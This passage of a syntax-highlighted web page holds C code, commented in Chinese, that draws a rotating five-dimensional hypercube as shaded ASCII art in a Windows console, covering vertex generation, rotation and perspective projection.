class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> a 8.0<span class="comment">//立方体边长</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pi 3.1415926</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size 55<span class="comment">//荧幕大小</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> delta 0.5<span class="comment">//遍历方块的步长</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> deltaA 0.02<span class="comment">//物体旋转速度</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> eOffest 0.001<span class="comment">//判定点是否在平面内时的方程阈值</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dimension 5<span class="comment">//维数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> transparent 0<span class="comment">//是否使用透明材质，同时是透明的倍率，四维推荐0.75，五维推荐0.6</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//坐标系说明：x向右，y向下，z向前</span></span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.,:;!om0&amp;%@&quot;</span>;<span class="comment">//阴影字符集十一个，便于选取</span></span><br><span class="line"><span class="keyword">float</span> lightSrcDis=<span class="number">5</span>*a;<span class="comment">//透视投影时的光源距离</span></span><br><span class="line"><span class="keyword">float</span> light[<span class="number">3</span>]=&#123;<span class="number">-2</span>,<span class="number">5</span>,<span class="number">0.8</span>&#125;;<span class="comment">//平行光向量，选取了一个比较舒服的打光</span></span><br><span class="line"><span class="keyword">int</span> rotateAround[]=&#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">2</span>&#125;;<span class="comment">//确定旋转基准，指定参与旋转的方向，两个一组，一组中小的在前大的在后</span></span><br><span class="line"><span class="keyword">float</span> vAxis[]     =&#123; <span class="number">3</span> , <span class="number">2</span> , <span class="number">1</span> &#125;;<span class="comment">//对应上边的配速倍率</span></span><br><span class="line"><span class="keyword">float</span> initialCam[<span class="number">3</span>]=&#123;<span class="number">0</span>,pi*<span class="number">5</span>/<span class="number">24</span>,<span class="number">0</span>&#125;;<span class="comment">//水平旋转 前后倾斜 左右倾斜，注意用弧度角，如 pi/4</span></span><br><span class="line"><span class="comment">/*initialObj[已删除]：正方体初始摆放的角度；initialObj：摄像机初始摆放的角度</span></span><br><span class="line"><span class="comment">旋转顺序：initialObj → rotateAround → initialCam</span></span><br><span class="line"><span class="comment">initialObj感觉用处不大，删了算了*/</span></span><br><span class="line"><span class="comment">/*计算向量模长</span></span><br><span class="line"><span class="comment">--------------------</span></span><br><span class="line"><span class="comment">Par:</span></span><br><span class="line"><span class="comment">    vec[]：向量</span></span><br><span class="line"><span class="comment">    len：元素个数</span></span><br><span class="line"><span class="comment">--------------------*/</span></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">calLength</span><span class="params">(<span class="keyword">float</span> *vec,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++) result+=vec[i]*vec[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    COORD pos=&#123;<span class="number">0</span>,<span class="number">0</span>&#125;;<span class="comment">//光标回零</span></span><br><span class="line">    <span class="keyword">float</span> lightLength=calLength(&amp;light[<span class="number">0</span>],<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) light[i]/=lightLength;<span class="comment">//单位化平行光向量</span></span><br><span class="line">    <span class="keyword">float</span> out_f[size][size],dis[size][size]=&#123;(<span class="keyword">float</span>)<span class="number">4</span>*size&#125;;<span class="comment">//记录亮度，映射到字符集 | 记录三维投影后到屏幕最小距离，由此判断遮罩关系</span></span><br><span class="line">    <span class="keyword">float</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;<span class="comment">//从坐标原点(屏幕左上角)偏移到屏幕中心所需的偏移量</span></span><br><span class="line">    <span class="keyword">int</span> face=((<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension<span class="number">-3</span>)*dimension*(dimension<span class="number">-1</span>)));</span><br><span class="line">    <span class="comment">/*  面数公式解释</span></span><br><span class="line"><span class="comment">        每个 n 维正方体中的每个 m 维边界都会被 n-m 个 m+1 维边界共用。比如正六面体中，每条棱被两个面共用，而每个顶点被三条棱共用。</span></span><br><span class="line"><span class="comment">        这样算来，对于任意一个 n 维的正方体，计算其不重复的二维正方形表面的数量应该为：</span></span><br><span class="line"><span class="comment">          6x8x10x...x(2n)/(2*3*...*(n-2))</span></span><br><span class="line"><span class="comment">        =(2^(n-2))*(n!)/2/(n-2)!</span></span><br><span class="line"><span class="comment">        =(2^(n-3))*n*(n-1)*/</span></span><br><span class="line">    <span class="keyword">int</span> vexNum=(<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension))*dimension;<span class="comment">//顶点个数*维数</span></span><br><span class="line">    <span class="keyword">int</span> vexLink[vexNum],normalLink[<span class="number">6</span>*face];<span class="comment">//相邻顶点集，如：三维中0号顶点与1，3，7相邻，则前dimension个元素为1，3，7 | 同理，法向量对应三角形面的三个vex的index</span></span><br><span class="line">    <span class="keyword">float</span> vex[vexNum],vexO[vexNum],vexProjected[vexNum],vexTemp[vexNum];<span class="comment">//当前顶点坐标 | 原始顶点坐标 | 投影后顶点坐标 | 临时</span></span><br><span class="line">    <span class="keyword">float</span> normalResultSet[<span class="number">6</span>*face];<span class="comment">//法向量结果集</span></span><br><span class="line">    <span class="built_in">memset</span>(vexLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(vexLink));<span class="comment">//初始化</span></span><br><span class="line">    <span class="built_in">memset</span>(normalLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(normalLink));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum;i++) vex[i]=a;</span><br><span class="line">    vex[dimension]=-a;<span class="comment">//这个算法需要有前车之鉴</span></span><br><span class="line">    <span class="comment">/*得到顶点坐标</span></span><br><span class="line"><span class="comment">    用上一向量一个元素变号，使其与之前任一向量都不同，该向量即要找的下一个顶点</span></span><br><span class="line"><span class="comment">    向量不同 = 元素至少有一个不相同*/</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">2</span>,difference,sign,i;vexIndex*dimension&lt;vexNum;vexIndex++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(sign=<span class="number">0</span>;sign&lt;dimension;sign++)&#123;<span class="comment">//遍历尝试改变vexIndex-1向量的每一单个元素正负号，执行条件：d为假</span></span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;vexIndex<span class="number">-1</span>;i++)&#123;difference=<span class="number">0</span>;<span class="comment">//遍历每个向量，执行条件：d为真，每次初始化d为假</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;!difference;k++)<span class="comment">//遍历比较vexIndex-1向量与之前向量的元素</span></span><br><span class="line">                    <span class="keyword">if</span>(sign==k?vex[i*dimension+k]!=<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[i*dimension+k]!=vex[(vexIndex<span class="number">-1</span>)*dimension+k]) difference=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(!difference) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(difference) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension;k++) vex[vexIndex*dimension+k]=k==sign?<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[(vexIndex<span class="number">-1</span>)*dimension+k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*测试代码：打印vex</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;vexNum/dimension;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">        else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;dimension;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(vex[i*dimension+j]&gt;=0)printf(&quot; %.0f,&quot;,vex[i*dimension+j]);</span></span><br><span class="line"><span class="comment">            else printf(&quot;%.0f,&quot;,vex[i*dimension+j]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;Vex Above\n&quot;);</span></span><br><span class="line"><span class="comment">    //*/</span></span><br><span class="line">    <span class="comment">/*得到相邻顶点，相邻顶点在vex中的index存储到vexLink中</span></span><br><span class="line"><span class="comment">    先在vexLink中已经建立link的部分找有没有之前link到过当前正在建立link的点，有则直接加入当前的link</span></span><br><span class="line"><span class="comment">    linkIndex：这是第几个已经建立link的点</span></span><br><span class="line"><span class="comment">    在link数量达到dimension之前，用当前向量与之前的向量作比较，如果_只_更_改_一_个_符_号_就可以匹配，则加入link，直到当前向量的link满dimension个*/</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>,n=<span class="number">0</span>;vexIndex*dimension&lt;vexNum;vexIndex++,n=<span class="number">0</span>)&#123;<span class="comment">//vexIndex：当前正在建立link的点 | n：已经建立到第几个link了</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> linkIndex=<span class="number">0</span>;linkIndex&lt;vexIndex;linkIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)</span><br><span class="line">                <span class="keyword">if</span>(vexLink[linkIndex*dimension+i]==vexIndex) vexLink[vexIndex*dimension+n++]=linkIndex;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=vexIndex+<span class="number">1</span>,difference=<span class="number">0</span>,tooManyDiff,sign;i*dimension&lt;vexNum&amp;&amp;n!=dimension;i++,difference=<span class="number">0</span>)&#123;<span class="comment">//遍历当前向量之后的每个向量 || difference：存在不一样的元素的数量</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;difference&lt;=<span class="number">1</span>;k++)<span class="comment">//遍历被比较向量中的每个元素</span></span><br><span class="line">                <span class="keyword">if</span>(vex[i*dimension+k]!=vex[vexIndex*dimension+k]) difference++;</span><br><span class="line">            <span class="keyword">if</span>(difference==<span class="number">1</span>) vexLink[vexIndex*dimension+n++]=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*测试代码：打印vexLink</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;vexNum/dimension;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">        else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;dimension;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(vexLink[i*dimension+j]&gt;=10)printf(&quot;%d, &quot;,vexLink[i*dimension+j]);</span></span><br><span class="line"><span class="comment">            else printf(&quot; %d ,&quot;,vexLink[i*dimension+j]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;vexLink Above\n&quot;);</span></span><br><span class="line"><span class="comment">    //*/</span></span><br><span class="line">    <span class="comment">//得到面对应的三个点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> cur1=<span class="number">0</span>,normalIndex=<span class="number">0</span>;cur1&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur1+=<span class="number">2</span>)<span class="comment">//cur n 表示指向第几个顶点，normalIndex表这是已经找到的第几个三角形</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> cur2=<span class="number">0</span>,pDiag=<span class="number">0</span>;cur2&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur2++)&#123;<span class="comment">//pDiag(Plane Diagonal)表是否为平面对角点，即cur1通过Link索引，在第二次可以索引到cur2</span></span><br><span class="line">            <span class="keyword">if</span>(cur1==cur2) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension&amp;&amp;!pDiag;i++)<span class="comment">//第一次索引的偏移</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;!pDiag;j++)<span class="comment">//第二次索引的偏移</span></span><br><span class="line">                    <span class="keyword">if</span>(vexLink[vexLink[cur1*dimension+i]*dimension+j]==cur2) pDiag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(pDiag)&#123;</span><br><span class="line">                <span class="keyword">int</span> <span class="keyword">public</span>[dimension<span class="number">-1</span>];</span><br><span class="line">                <span class="built_in">memset</span>(<span class="keyword">public</span>,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(<span class="keyword">public</span>));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,k=<span class="number">0</span>;i&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                        <span class="keyword">if</span>(vexLink[cur1*dimension+i]==vexLink[cur2*dimension+j]) <span class="keyword">public</span>[k++]=vexLink[cur1*dimension+i];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=normalIndex;i++)<span class="comment">//i指向normalLink中的向量</span></span><br><span class="line">                    <span class="keyword">if</span>  (   (cur1==normalLink[i*<span class="number">3</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">2</span>])<span class="comment">//cur1与第i个normalLink中存在元素重合？</span></span><br><span class="line">                        &amp;&amp;  (cur2==normalLink[i*<span class="number">3</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]))<span class="comment">//cur2与第i个normalLink中存在元素重合？</span></span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                            <span class="keyword">if</span>(<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]) <span class="keyword">public</span>[j]=<span class="number">-1</span>;<span class="comment">//public[j]与第i个normalLink中存在元素重合？</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">public</span>[i]!=<span class="number">-1</span>)&#123;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)normalLink[normalIndex*<span class="number">3</span>+j]=j==<span class="number">0</span>?cur1:j==<span class="number">1</span>?cur2:<span class="keyword">public</span>[i];</span><br><span class="line">                        normalIndex++;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">/*测试代码：打印normalLink</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;2*face;i++)&#123;</span></span><br><span class="line"><span class="comment">        //if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">        //else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;3;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(normalLink[i*3+j]&gt;=10) printf(&quot;%d, &quot;,normalLink[i*3+j]);</span></span><br><span class="line"><span class="comment">            else printf(&quot;0%d, &quot;,normalLink[i*3+j]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;normalLink Above\n&quot;);</span></span><br><span class="line"><span class="comment">    //*/</span></span><br><span class="line">    <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="built_in">memcpy</span>(vexO,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="comment">//=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">float</span> angle=<span class="number">0</span>;;angle+=deltaA)&#123;<span class="comment">//大循环</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                out_f[i][j]=<span class="number">-1</span>;</span><br><span class="line">                dis[i][j]=(<span class="keyword">float</span>)(<span class="number">-4.0</span>*size);</span><br><span class="line">            &#125;<span class="comment">//初始化</span></span><br><span class="line">        <span class="built_in">memcpy</span>(vex,vexO,<span class="keyword">sizeof</span>(vexO));<span class="comment">//还原vex到初始状态，否则带角加速度</span></span><br><span class="line">        <span class="comment">//计算向量与旋转矩阵相乘，0太多，没必要搞真正的矩阵乘法</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> rotationIndex=<span class="number">0</span>,r_i=<span class="number">0</span>;rotationIndex&lt;<span class="keyword">sizeof</span>(rotateAround)/<span class="keyword">sizeof</span>(rotateAround[<span class="number">0</span>])/<span class="number">2</span>;rotationIndex++,r_i=<span class="number">0</span>)&#123;<span class="comment">//限定旋转次数；rotateAround每行2个元素，j的作用是选取他们</span></span><br><span class="line">                <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)<span class="comment">//遍历所有的轴</span></span><br><span class="line">                    <span class="keyword">if</span>(i==rotateAround[rotationIndex*<span class="number">2</span>+r_i])<span class="comment">//当前轴是被旋转轴时，结果符合旋转矩阵计算结果</span></span><br><span class="line">                        vex[vexIndex*dimension+i]=vexTemp[vexIndex*dimension+i]*<span class="built_in">cos</span>(vAxis[rotationIndex]*angle)+vexTemp[vexIndex*dimension+rotateAround[rotationIndex*<span class="number">2</span>+!r_i]]*<span class="built_in">sin</span>(vAxis[rotationIndex]*angle)*(<span class="number">1</span><span class="number">-2</span>*r_i++);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;<span class="comment">//摄像机旋转</span></span><br><span class="line">            <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">            <span class="keyword">int</span> c=!(i^<span class="number">1</span>),b=i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+!(i^<span class="number">1</span>)] = vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) + vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)] = vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) - vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//以透视投影降维</span></span><br><span class="line">        <span class="keyword">float</span> xyBefore[<span class="number">2</span>*vexNum];<span class="comment">//备份x，y轴用于计算平面方程</span></span><br><span class="line">        <span class="built_in">memcpy</span>(vexProjected,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> d=dimension<span class="number">-1</span>;d&gt;=<span class="number">2</span>;d--)&#123;<span class="comment">//d+1 = 当前维数</span></span><br><span class="line">            <span class="keyword">if</span>(d==<span class="number">2</span>)&#123;<span class="comment">//趁还在三维的时候先把法向量算了，不然反光的面就也透视了</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum/dimension;i++) <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">1</span>;j++) xyBefore[i*<span class="number">2</span>+j]=vexProjected[i*dimension+j];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++)&#123;</span><br><span class="line">                    <span class="keyword">float</span> vec1[<span class="number">3</span>],vec2[<span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                        vec1[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">1</span>]*dimension+i];</span><br><span class="line">                        vec2[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">2</span>]*dimension+i];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]=vec1[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>]*vec2[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]-vec1[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]*vec2[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">float</span> normalLength=calLength(&amp;normalResultSet[<span class="number">3</span>*normalIndex],<span class="number">3</span>);</span><br><span class="line">                    <span class="keyword">if</span>(normalLength!=<span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]/=normalLength;</span><br><span class="line">                    <span class="keyword">if</span>(!transparent)&#123;<span class="comment">//以全局质心计算，使法向量向外</span></span><br><span class="line">                        <span class="keyword">float</span> slidedVec[<span class="number">3</span>],slideLength,vexLength=calLength(&amp;vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension],<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) slidedVec[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]+normalResultSet[<span class="number">3</span>*normalIndex+i];</span><br><span class="line">                        slideLength=calLength(slidedVec,<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">if</span>(slideLength&gt;vexLength)</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]*=<span class="number">-1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)<span class="comment">//vexIndex：第几个向量，axis：该向量的第几个元素</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> axis=<span class="number">0</span>;axis&lt;d;axis++) vexProjected[vexIndex*dimension+axis]=vexProjected[vexIndex*dimension+axis]*lightSrcDis/(lightSrcDis-vexProjected[vexIndex*dimension+d]);</span><br><span class="line">            <span class="comment">/*测试代码：打印vexProjected</span></span><br><span class="line"><span class="comment">            for(int i=0;i&lt;vexNum/dimension&amp;&amp;d&gt;2;i++)&#123;</span></span><br><span class="line"><span class="comment">                if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">                else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">                for(int j=0;j&lt;dimension;j++)&#123;</span></span><br><span class="line"><span class="comment">                    if(vexProjected[i*dimension+j]&gt;=0)printf(&quot; %.2f,&quot;,vexProjected[i*dimension+j]);</span></span><br><span class="line"><span class="comment">                    else printf(&quot;%.2f,&quot;,vexProjected[i*dimension+j]);</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">                printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            if(d&gt;2) printf(&quot;VexPorjected Above , dimension = %d\n&quot;,d);</span></span><br><span class="line"><span class="comment">            //*/</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//输出到out_f[]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> sx=<span class="number">0</span>;sx&lt;size;sx++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> sy=<span class="number">0</span>;sy&lt;size;sy++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>,inside=<span class="number">1</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++,inside=<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">float</span> tCenter[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;<span class="comment">//当前三角形质心</span></span><br><span class="line">                    <span class="keyword">float</span> x[<span class="number">3</span>],y[<span class="number">3</span>],z[<span class="number">3</span>],xb[<span class="number">3</span>],yb[<span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                        x[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension];</span><br><span class="line">                        tCenter[<span class="number">0</span>]+=x[i];</span><br><span class="line">                        y[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">1</span>];</span><br><span class="line">                        tCenter[<span class="number">1</span>]+=y[i];</span><br><span class="line">                        z[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">2</span>];</span><br><span class="line">                        xb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>];</span><br><span class="line">                        yb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>+<span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                    tCenter[<span class="number">0</span>]/=<span class="number">3</span>;</span><br><span class="line">                    tCenter[<span class="number">1</span>]/=<span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>&amp;&amp;inside;i++)&#123;<span 